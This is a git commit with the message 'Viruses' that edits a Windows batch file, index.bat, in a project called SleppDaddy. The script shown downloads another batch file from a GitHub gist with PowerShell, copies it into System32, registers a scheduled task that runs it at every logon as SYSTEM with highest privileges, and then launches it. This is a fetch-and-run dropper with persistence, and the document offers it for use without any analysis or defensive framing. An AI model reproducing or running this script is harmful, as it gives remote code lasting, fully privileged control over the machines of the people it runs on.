77be172ba03f2fb2328ba2d40b77e114d6f8e04d
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-14 19:22:11 +0100

    Viruses

--- SleppDaddy/index.bat
+++ SleppDaddy/index.bat
@@ -2,6 +2,6 @@
 
 cd /d %windir%\system32
 powershell -Command "& { Invoke-WebRequest -Uri 'https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat' -OutFile 'sleepdaddy.bat' }"
-move /y checkpc.bat %windir%\System32\
+move /y sleepdaddy.bat %windir%\System32\
 schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\sleepdaddy.bat" /sc ONLOGON /rl highest /ru System /f
 start sleepdaddy.bat
